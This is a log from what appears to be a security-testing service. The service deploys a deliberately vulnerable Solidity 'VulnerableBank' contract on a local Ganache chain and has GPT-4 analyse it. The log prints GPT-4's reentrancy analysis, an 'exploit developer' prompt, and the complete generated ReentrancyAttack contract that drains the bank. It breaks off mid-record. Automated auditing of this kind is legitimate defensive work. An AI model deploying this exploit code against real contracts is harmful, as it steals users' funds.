2025-07-05 13:13:11,261 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:13:11,264 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:13:11,267 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:13:11,269 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:13:11,274 - werkzeug - INFO - 192.168.112.1 - - [05/Jul/2025 13:13:11] "POST /login HTTP/1.1" 200 -
2025-07-05 13:13:18,334 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:13:18,340 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:13:18,343 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:13:18,347 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 13:13:18,351 - werkzeug - INFO - 192.168.112.1 - - [05/Jul/2025 13:13:18] "OPTIONS /analyze HTTP/1.1" 200 -
2025-07-05 13:13:18,371 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 13:13:18,382 - app.api.contract - INFO - Analyzing code snippet
2025-07-05 13:13:18,402 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-07-05 13:13:18,408 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmptx41rdbi.sol
2025-07-05 13:13:18,418 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-05 13:13:18,419 - app.services.contract_service - INFO - Compiling contract...
2025-07-05 13:13:18,567 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-07-05 13:13:19,470 - solcx - INFO - Using solc version 0.8.0
2025-07-05 13:13:19,472 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-07-05 13:13:19,477 - solcx - INFO - Using solc version 0.8.0
2025-07-05 13:13:20,468 - app.services.contract_service - INFO - Compilation result: 1 contracts compiled
2025-07-05 13:13:20,470 - app.services.contract_service - INFO - Deploying 1 contracts...
2025-07-05 13:13:20,931 - app.services.contract_service - INFO - Contract VulnerableBank deployed at 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24
2025-07-05 13:13:20,933 - app.services.contract_service - INFO - Setting up contract VulnerableBank...
2025-07-05 13:13:21,401 - app.services.contract_service - INFO - Contract VulnerableBank setup completed
2025-07-05 13:13:21,402 - app.services.contract_service - INFO - Funding contract VulnerableBank for attack testing...
2025-07-05 13:13:21,929 - app.services.contract_service - INFO - Contract VulnerableBank funded
2025-07-05 13:13:21,931 - app.services.contract_service - INFO - Building contract observation...
2025-07-05 13:13:22,410 - app.services.contract_service - INFO - Contract observation built successfully
2025-07-05 13:13:22,411 - app.services.contract_service - INFO - Generating attack strategy...
2025-07-05 13:13:22,412 - app.services.contract_service - INFO - Running Slither analysis...
2025-07-05 13:13:22,425 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-07-05 13:13:22,448 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-07-05 13:13:22,450 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-07-05 13:13:22,451 - app.modules.attack_generator - INFO - Contract name: VulnerableBank
2025-07-05 13:13:22,452 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-07-05 13:13:22,453 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-07-05 13:13:22,456 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:13:22,458 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:13:22,459 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:13:36,092 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:13:36,136 - app.modules.attack_generator - INFO - Received response from OpenAI API in 13.68 seconds
2025-07-05 13:13:36,144 - app.modules.attack_generator - INFO - Contract analysis completed in 13.68 seconds
2025-07-05 13:13:36,147 - app.modules.attack_generator - INFO - Vulnerability assessment: **

- **Reentrancy Vulnerability in `withdraw` function:**  
  The contract sends ETH to `msg.sender...
2025-07-05 13:13:36,150 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-07-05 13:13:36,151 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:13:36,152 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:13:36,154 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:13:39,434 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 13:13:39,453 - app.api.contract - INFO - Analyzing code snippet
2025-07-05 13:13:39,469 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-07-05 13:13:39,473 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpfo1636da.sol
2025-07-05 13:13:39,480 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-05 13:13:39,482 - app.services.contract_service - INFO - Compiling contract...
2025-07-05 13:13:39,604 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.4.17+commit.bdeb9e52
2025-07-05 13:13:40,227 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:13:40,234 - app.modules.attack_generator - INFO - Received response from OpenAI API in 4.08 seconds
2025-07-05 13:13:40,237 - app.modules.attack_generator - INFO - Attack code generation completed in 4.08 seconds
2025-07-05 13:13:40,238 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 962
2025-07-05 13:13:40,239 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 17.76 seconds
2025-07-05 13:13:40,240 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-07-05 13:13:40,243 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmptx41rdbi.sol",\n  "contracts": [\n    {\n      "contract_name": "VulnerableBank",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "deposit",\n          "outputs": [],\n          "stateMutability": "payable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "getBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deposit",\n          "signature": "deposit()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "payable",\n          "payable": true,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBalance",\n          "signature": "getBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw(uint256)",\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99984357800000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 0\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 3000000000000000000\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getBalance": 0\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract VulnerableBank {\\n    mapping(address => uint256) public balances;\\n\\n    // Fonction pour d\\u00e9poser des fonds\\n    function deposit() public payable {\\n        balances[msg.sender] += msg.value;\\n    }\\n\\n    // Fonction vuln\\u00e9rable de retrait\\n    function withdraw(uint256 _amount) public {\\n        require(balances[msg.sender] >= _amount, \\"Solde insuffisant\\");\\n\\n        // Envoi du montant demand\\u00e9\\n        (bool success, ) = msg.sender.call{value: _amount}(\\"\\");\\n        require(success, unicode\\"\\u00c9chec du transfert\\");\\n\\n        // Mise \\u00e0 jour du solde APR\\u00c8S le transfert\\n        balances[msg.sender] -= _amount;\\n    }\\n\\n    // Consulter le solde\\n    function getBalance() public view returns (uint256) {\\n        return balances[msg.sender];\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. **Contract Analysis:**\n\n- **Contract Name:** VulnerableBank  \n- **Solidity Version:** pragma solidity ^0.8.0  \n- **Functionality:**  \n  - Users can deposit ETH via `deposit()` which increments their balance in the `balances` mapping.  \n  - Users can withdraw ETH via `withdraw(uint256 _amount)` which checks if the user has enough balance, sends ETH using a low-level call, then updates the balance after the transfer.  \n  - `getBalance()` returns the caller‚Äôs balance.  \n\n- **State Variables:**  \n  - `mapping(address => uint256) balances` tracks user deposits.  \n- **ETH Holding:** The contract holds ETH deposited by users.  \n\n---\n\n2. **Vulnerability Assessment:**\n\n- **Reentrancy Vulnerability in `withdraw` function:**  \n  The contract sends ETH to `msg.sender` via a low-level call:  \n  ```solidity\n  (bool success, ) = msg.sender.call{value: _amount}("");\n  require(success, "√âchec du transfert");\n  balances[msg.sender] -= _amount;\n  ```  \n  The balance is updated **after** the external call. This allows a malicious contract to re-enter the `withdraw` function during the call and withdraw funds multiple times before the balance is updated.  \n\n- **Mechanism:**  \n  1. Attacker deposits some ETH to have a positive balance.  \n  2. Attacker calls `withdraw` to withdraw some amount.  \n  3. During the external call to `msg.sender.call{value: _amount}("")`, the attacker‚Äôs fallback or receive function triggers and calls `withdraw` again before the balance is decremented.  \n  4. This repeats, draining the contract‚Äôs ETH beyond the attacker‚Äôs balance.  \n\n- **Potential Impact:**  \n  - Complete or partial draining of the contract‚Äôs ETH balance by a malicious user.  \n  - Loss of user funds and contract insolvency.  \n\n- **Other observations:**  \n  - No access control or withdrawal limits.  \n  - No use of reentrancy guards or checks-effects-interactions pattern.  \n  - Uses Solidity 0.8.0 which has built-in overflow checks, so no arithmetic overflow issues here.  \n\n---\n\n3. **Exploitation Requirements:**\n\n- **Setup:**  \n  - Deploy a malicious contract with a fallback or receive function that calls `withdraw` again on the VulnerableBank contract.  \n  - Deposit some ETH into VulnerableBank to have a positive balance.  \n\n- **Exploit Steps:**  \n  1. Call `withdraw` from the malicious contract for a certain amount.  \n  2. When the ETH is sent back, the fallback triggers and calls `withdraw` again before the balance is updated.  \n  3. Repeat the reentrant calls recursively until the contract‚Äôs ETH balance is drained or gas runs out.  \n\n---\n\n**Summary:**  \nThe `VulnerableBank` contract is vulnerable to a classic reentrancy attack due to updating user balances **after** sending ETH via a low-level call. This allows an attacker to recursively withdraw more funds than their balance, potentially draining the contract‚Äôs ETH. The vulnerability can be fixed by updating the balance **before** the external call or by using a reentrancy guard.', 'contract_analysis': '**\n\n- **Contract Name:** VulnerableBank  \n- **Solidity Version:** pragma solidity ^0.8.0  \n- **Functionality:**  \n  - Users can deposit ETH via `deposit()` which increments their balance in the `balances` mapping.  \n  - Users can withdraw ETH via `withdraw(uint256 _amount)` which checks if the user has enough balance, sends ETH using a low-level call, then updates the balance after the transfer.  \n  - `getBalance()` returns the caller‚Äôs balance.  \n\n- **State Variables:**  \n  - `mapping(address => uint256) balances` tracks user deposits.  \n- **ETH Holding:** The contract holds ETH deposited by users.  \n\n---\n\n2. **', 'vulnerability_assessment': '**\n\n- **Reentrancy Vulnerability in `withdraw` function:**  \n  The contract sends ETH to `msg.sender` via a low-level call:  \n  ```solidity\n  (bool success, ) = msg.sender.call{value: _amount}("");\n  require(success, "√âchec du transfert");\n  balances[msg.sender] -= _amount;\n  ```  \n  The balance is updated **after** the external call. This allows a malicious contract to re-enter the `withdraw` function during the call and withdraw funds multiple times before the balance is updated.  \n\n- **Mechanism:**  \n  1. Attacker deposits some ETH to have a positive balance.  \n  2. Attacker calls `withdraw` to withdraw some amount.  \n  3. During the external call to `msg.sender.call{value: _amount}("")`, the attacker‚Äôs fallback or receive function triggers and calls `withdraw` again before the balance is decremented.  \n  4. This repeats, draining the contract‚Äôs ETH beyond the attacker‚Äôs balance.  \n\n- **Potential Impact:**  \n  - Complete or partial draining of the contract‚Äôs ETH balance by a malicious user.  \n  - Loss of user funds and contract insolvency.  \n\n- **Other observations:**  \n  - No access control or withdrawal limits.  \n  - No use of reentrancy guards or checks-effects-interactions pattern.  \n  - Uses Solidity 0.8.0 which has built-in overflow checks, so no arithmetic overflow issues here.  \n\n---\n\n3. **', 'exploitation_requirements': '**\n\n- **Setup:**  \n  - Deploy a malicious contract with a fallback or receive function that calls `withdraw` again on the VulnerableBank contract.  \n  - Deposit some ETH into VulnerableBank to have a positive balance.  \n\n- **Exploit Steps:**  \n  1. Call `withdraw` from the malicious contract for a certain amount.  \n  2. When the ETH is sent back, the fallback triggers and calls `withdraw` again before the balance is updated.  \n  3. Repeat the reentrant calls recursively until the contract‚Äôs ETH balance is drained or gas runs out.', 'analysis_duration': 13.678138256072998}, 'attack': {'attack_prompt': '\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: **\n\n- **Contract Name:** VulnerableBank  \n- **Solidity Version:** pragma solidity ^0.8.0  \n- **Functionality:**  \n  - Users can deposit ETH via `deposit()` which increments their balance in the `balances` mapping.  \n  - Users can withdraw ETH via `withdraw(uint256 _amount)` which checks if the user has enough balance, sends ETH using a low-level call, then updates the balance after the transfer.  \n  - `getBalance()` returns the caller‚Äôs balance.  \n\n- **State Variables:**  \n  - `mapping(address => uint256) balances` tracks user deposits.  \n- **ETH Holding:** The contract holds ETH deposited by users.  \n\n---\n\n2. **\n\nVulnerability Assessment: **\n\n- **Reentrancy Vulnerability in `withdraw` function:**  \n  The contract sends ETH to `msg.sender` via a low-level call:  \n  ```solidity\n  (bool success, ) = msg.sender.call{value: _amount}("");\n  require(success, "√âchec du transfert");\n  balances[msg.sender] -= _amount;\n  ```  \n  The balance is updated **after** the external call. This allows a malicious contract to re-enter the `withdraw` function during the call and withdraw funds multiple times before the balance is updated.  \n\n- **Mechanism:**  \n  1. Attacker deposits some ETH to have a positive balance.  \n  2. Attacker calls `withdraw` to withdraw some amount.  \n  3. During the external call to `msg.sender.call{value: _amount}("")`, the attacker‚Äôs fallback or receive function triggers and calls `withdraw` again before the balance is decremented.  \n  4. This repeats, draining the contract‚Äôs ETH beyond the attacker‚Äôs balance.  \n\n- **Potential Impact:**  \n  - Complete or partial draining of the contract‚Äôs ETH balance by a malicious user.  \n  - Loss of user funds and contract insolvency.  \n\n- **Other observations:**  \n  - No access control or withdrawal limits.  \n  - No use of reentrancy guards or checks-effects-interactions pattern.  \n  - Uses Solidity 0.8.0 which has built-in overflow checks, so no arithmetic overflow issues here.  \n\n---\n\n3. **\n\nExploitation Requirements: **\n\n- **Setup:**  \n  - Deploy a malicious contract with a fallback or receive function that calls `withdraw` again on the VulnerableBank contract.  \n  - Deposit some ETH into VulnerableBank to have a positive balance.  \n\n- **Exploit Steps:**  \n  1. Call `withdraw` from the malicious contract for a certain amount.  \n  2. When the ETH is sent back, the fallback triggers and calls `withdraw` again before the balance is updated.  \n  3. Repeat the reentrant calls recursively until the contract‚Äôs ETH balance is drained or gas runs out.\n\n\nTarget Contract Address: 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named \'attack\', \'exploit\', or \'run\')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.8.0\n', 'attack_raw_response': '```solidity\npragma solidity 0.8.0;\n\ninterface IVulnerableBank {\n    function deposit() external payable;\n    function withdraw(uint256 _amount) external;\n    function getBalance() external view returns (uint256);\n}\n\ncontract ReentrancyAttack {\n    IVulnerableBank public vulnerableBank;\n    uint256 public attackAmount;\n\n    constructor(address _vulnerableBank) {\n        vulnerableBank = IVulnerableBank(_vulnerableBank);\n    }\n\n    function attack() external payable {\n        require(msg.value > 0, "Send ETH to attack");\n        attackAmount = msg.value;\n        vulnerableBank.deposit{value: msg.value}();\n        vulnerableBank.withdraw(attackAmount);\n    }\n\n    receive() external payable {\n        uint256 bankBalance = address(vulnerableBank).balance;\n        if (bankBalance >= attackAmount) {\n            vulnerableBank.withdraw(attackAmount);\n        }\n    }\n\n    function collect() external {\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}\n```', 'code': 'pragma solidity 0.8.0;\n\ninterface IVulnerableBank {\n    function deposit() external payable;\n    function withdraw(uint256 _amount) external;\n    function getBalance() external view returns (uint256);\n}\n\ncontract ReentrancyAttack {\n    IVulnerableBank public vulnerableBank;\n    uint256 public attackAmount;\n\n    constructor(address _vulnerableBank) {\n        vulnerableBank = IVulnerableBank(_vulnerableBank);\n    }\n\n    function attack() external payable {\n        require(msg.value > 0, "Send ETH to attack");\n        attackAmount = msg.value;\n        vulnerableBank.deposit{value: msg.value}();\n        vulnerableBank.withdraw(attackAmount);\n    }\n\n    receive() external payable {\n        uint256 bankBalance = address(vulnerableBank).balance;\n        if (bankBalance >= attackAmount) {\n            vulnerableBank.withdraw(attackAmount);\n        }\n    }\n\n    function collect() external {\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}', 'code_type': 'solidity', 'attack_duration': 4.081847906112671}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmptx41rdbi.sol",\n  "contracts": [\n    {\n      "contract_name": "VulnerableBank",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "deposit",\n          "outputs": [],\n          "stateMutability": "payable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "getBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deposit",\n          "signature": "deposit()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "payable",\n          "payable": true,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBalance",\n          "signature": "getBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw(uint256)",\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99984357800000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 0\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 3000000000000000000\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getBalance": 0\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract VulnerableBank {\\n    mapping(address => uint256) public balances;\\n\\n    // Fonction pour d\\u00e9poser des fonds\\n    function deposit() public payable {\\n        balances[msg.sender] += msg.value;\\n    }\\n\\n    // Fonction vuln\\u00e9rable de retrait\\n    function withdraw(uint256 _amount) public {\\n        require(balances[msg.sender] >= _amount, \\"Solde insuffisant\\");\\n\\n        // Envoi du montant demand\\u00e9\\n        (bool success, ) = msg.sender.call{value: _amount}(\\"\\");\\n        require(success, unicode\\"\\u00c9chec du transfert\\");\\n\\n        // Mise \\u00e0 jour du solde APR\\u00c8S le transfert\\n        balances[msg.sender] -= _amount;\\n    }\\n\\n    // Consulter le solde\\n    function getBalance() public view returns (uint256) {\\n        return balances[msg.sender];\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. **Contract Analysis:**\n\n- **Contract Name:** VulnerableBank  \n- **Solidity Version:** pragma solidity ^0.8.0  \n- **Functionality:**  \n  - Users can deposit ETH via `deposit()` which increments their balance in the `balances` mapping.  \n  - Users can withdraw ETH via `withdraw(uint256 _amount)` which checks if the user has enough balance, sends ETH using a low-level call, then updates the balance after the transfer.  \n  - `getBalance()` returns the caller‚Äôs balance.  \n\n- **State Variables:**  \n  - `mapping(address => uint256) balances` tracks user deposits.  \n- **ETH Holding:** The contract holds ETH deposited by users.  \n\n---\n\n2. **Vulnerability Assessment:**\n\n- **Reentrancy Vulnerability in `withdraw` function:**  \n  The contract sends ETH to `msg.sender` via a low-level call:  \n  ```solidity\n  (bool success, ) = msg.sender.call{value: _amount}("");\n  require(success, "√âchec du transfert");\n  balances[msg.sender] -= _amount;\n  ```  \n  The balance is updated **after** the external call. This allows a malicious contract to re-enter the 